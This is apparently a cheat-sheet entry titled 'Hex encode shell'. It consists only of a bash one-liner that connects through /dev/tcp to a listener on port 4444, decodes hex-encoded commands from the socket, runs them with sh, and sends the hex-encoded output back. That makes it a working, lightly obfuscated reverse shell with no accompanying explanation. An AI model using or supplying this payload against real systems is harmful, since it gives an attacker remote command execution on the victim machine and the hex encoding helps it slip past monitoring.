Hex encode shell

```
0<&137-;exec 137<>/dev/tcp/127.0.0.1/4444;cat <&137 |while read ff; do echo $ff|xxd -r -p|sh |xxd -p >&137 2>&137;done
```
